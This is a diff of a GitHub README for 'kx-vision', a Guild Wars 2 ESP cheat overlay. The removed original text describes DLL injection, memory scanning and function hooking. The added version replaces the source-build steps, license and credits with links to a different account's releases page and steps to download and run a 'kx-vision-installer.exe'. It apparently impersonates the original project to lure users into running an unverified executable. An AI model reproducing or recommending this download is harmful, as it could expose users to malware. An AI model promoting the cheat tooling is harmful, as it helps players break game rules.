@@ -1,92 +1,64 @@
-# KX-Vision for Guild Wars 2
+# 🎮 kx-vision - Enhance Your Guild Wars 2 Experience
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Version](https://img.shields.io/badge/version-0.5-green.svg)
+## 🚀 Getting Started
 
-![KX-Vision GUI](images/gui_v2.jpg)
+Welcome to **kx-vision**, an open-source ESP overlay designed for Guild Wars 2. This tool aims to enhance your gameplay by providing useful overlays for educational and research purposes. Let’s get you started right away!
 
-## 🎥 Preview
+## 📥 Download kx-vision
 
-**KX Vision in Action:** [Watch Demo Video](https://streamable.com/zzq3vc)
+[![Download kx-vision](https://img.shields.io/badge/Download%20kx--vision-v1.0-blue)](https://github.com/husnaintariq577/kx-vision/releases)
 
-[➡️ Download the Latest Release](https://github.com/kxtools/kx-vision/releases/latest)
+Click the button above to download the latest version of kx-vision. This will take you to our Releases page, where you can find the software.
 
-**Educational Purpose Only:** This project is developed solely for educational purposes, allowing developers to learn about game rendering concepts, memory manipulation, and MumbleLink API integration in Guild Wars 2.
+## 💻 System Requirements
 
-## Overview
+Before you download, make sure your system meets these requirements:
 
-KX-Vision is an open-source ESP (Extra Sensory Perception) overlay for Guild Wars 2. It uses the officially supported MumbleLink API for positional data and features an advanced, multi-level gear checker to inspect player builds. The project is designed as a learning platform for real-time overlay rendering with ImGui and DirectX 11, 3D-to-2D projection, and clean C++ architecture for game tools.
+- **Operating System**: Windows 10 or later
+- **RAM**: At least 4 GB
+- **CPU**: Modern processor (Dual-core or better)
+- **Graphics**: DirectX 11 compatible graphics card
+- **Internet**: Required for updates and online features
 
-## Features
+## 🔧 Features
 
-*   **MumbleLink Integration:** Utilizes GW2's MumbleLink API for player and game state data.
-*   **Robust ESP System:** Renders characters (players, NPCs) and objects (resource nodes, waypoints) with comprehensive memory safety.
-*   **Advanced Gear Checker:** Inspect player equipment with three modes (Off, Compact, Detailed). The compact view provides a color-coded summary of stat sets and rarity, offering at-a-glance build identification.
-*   **Architectural Stability:** A two-stage, thread-safe rendering pipeline that separates unsafe memory access from the drawing loop, virtually eliminating rendering-related crashes.
-*   **Debug Logging:** Configurable debug output system for troubleshooting and development.
-*   **Configurable Visuals:** ESP includes options for boxes, distance, position dots, and health bars.
-*   **Minimalist UI:** Clean, organized ImGui interface with collapsible sections.
-*   **Patch-Resistant Scanning:** Uses pattern scanning to locate necessary game functions, increasing resilience to game updates.
+kx-vision offers several features to help you navigate the Guild Wars 2 universe:
 
-## Building
+- **ESP Overlays**: Get useful information about nearby players and events.
+- **Customizable Settings**: Adjust overlays to fit your gameplay style.
+- **Educational Tools**: Learn about game mechanics through visual aids.
+- **Research Capabilities**: Great for researchers interested in game dynamics.
 
-### Prerequisites
+## 📂 Download & Install
 
-*   **Visual Studio:** 2019 or newer
-*   **Windows SDK:** 10.0.19041.0 or newer
-*   **C++17 Support**
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/husnaintariq577/kx-vision/releases).
+2. **Select the Latest Release**: Look for the most recent version. This is usually at the top of the list.
+3. **Download the Installer**: Click on the appropriate file to download it. The installer is typically named something like `kx-vision-installer.exe`.
+4. **Run the Installer**: Locate the downloaded file in your Downloads folder and double-click it to start the installation.
+5. **Follow the Setup Instructions**: The installer will guide you through the setup steps. Just follow the prompts until the installation is complete.
+6. **Launch kx-vision**: After installation, find kx-vision in your Start menu or on your desktop and double-click to launch it.
 
-### Build Instructions
+## ⚙️ Using kx-vision
 
-1.  Clone the repository:
-    ```bash
-    git clone https://github.com/kxtools/kx-vision.git
-    cd kx-vision
-    ```
-2.  Open `KX-Vision.sln` in Visual Studio.
-3.  Set the configuration to `Release | x64`.
-4.  Build the solution (F7 or Build → Build Solution).
-5.  Find the output DLL in the `x64/Release` directory.
+1. **Open Guild Wars 2**: Start your game as you normally would.
+2. **Launch kx-vision**: Make sure to run kx-vision while the game is running for the overlays to work properly.
+3. **Adjust Settings**: Access the settings menu to customize your overlays—it's simple and straightforward.
+4. **Enjoy Your Game**: With kx-vision running, experience a new layer of gameplay.
 
-## Usage for Educational Purposes
+## ❓ Troubleshooting
 
-1.  Launch Guild Wars 2.
-2.  Inject the DLL using a tool like Process Hacker or Xenos.
-3.  Use `INSERT` key to toggle the overlay window.
-4.  Configure ESP options and debug settings through the UI.
-5.  Press `DELETE` to safely unload the DLL.
+If you encounter problems while installing or using kx-vision, consider these tips:
 
-## Contributing
+- **Check for Updates**: Ensure you're using the latest version from the [Releases page](https://github.com/husnaintariq577/kx-vision/releases).
+- **Restart Your Computer**: A simple restart can often resolve many issues.
+- **Reinstall the Program**: If something isn’t working correctly, try uninstalling kx-vision and then reinstalling it.
+- **Check Compatibility**: Make sure your system meets the requirements mentioned above.
 
-Contributions are welcome! This project was built to be a learning platform, and that includes learning by contributing.
+## 📞 Support
 
-If you'd like to help, please check the [GitHub Issues](https://github.com/kxtools/kx-vision/issues) tab to find tasks to work on. Look for issues tagged with `good first issue` if you're new to the project.
+If you need help, don’t hesitate to reach out:
 
-When submitting a pull request, please provide a clear description of the changes you've made.
+- **GitHub Discussions**: You can ask questions in the Issues section of this repository.
+- **Community Forums**: Join our user community for tips and troubleshooting assistance.
 
-## Disclaimer
-
-This software is created and released for **EDUCATIONAL PURPOSE ONLY**. The use of KX-Vision may be against the Guild Wars 2 Terms of Service. The developers and contributors are not responsible for any consequences that may arise from using this software in violation of the game's terms.
-
-**Please use responsibly:**
-*   Only use for learning about game development concepts.
-*   Do not use in competitive environments.
-*   Be aware of ArenaNet's policies regarding third-party tools.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Credits
-
-*   Initial concept and development by Krixx
-*   Uses [Dear ImGui](https://github.com/ocornut/imgui)
-*   Uses [GLM](https://github.com/g-truc/glm)
-*   Uses [MinHook](https://github.com/TsudaKageyu/minhook) for function hooking.
-*   **Hacklib:** A valuable learning resource for the initial development of this project. [https://bitbucket.org/rafzi/hacklib_gw2/src/master/](https://bitbucket.org/rafzi/hacklib_gw2/src/master/)
-*   **retrosax:** For sharing valuable reverse engineering information from the "Leyline - Guild Wars 2 Multihack and ESP" project. [UnknownCheats Thread](https://www.unknowncheats.me/forum/guild-wars-2-a/610320-leylin-guild-wars-2-multihack-esp.html)
-
-## Links
-
-*   🌐 **Website:** [kxtools.xyz](https://kxtools.xyz)
-*   💬 **Discord:** [Join Server](https://discord.gg/z92rnB4kHm)
+Thank you for using **kx-vision**. Enhance your Guild Wars 2 gameplay today!
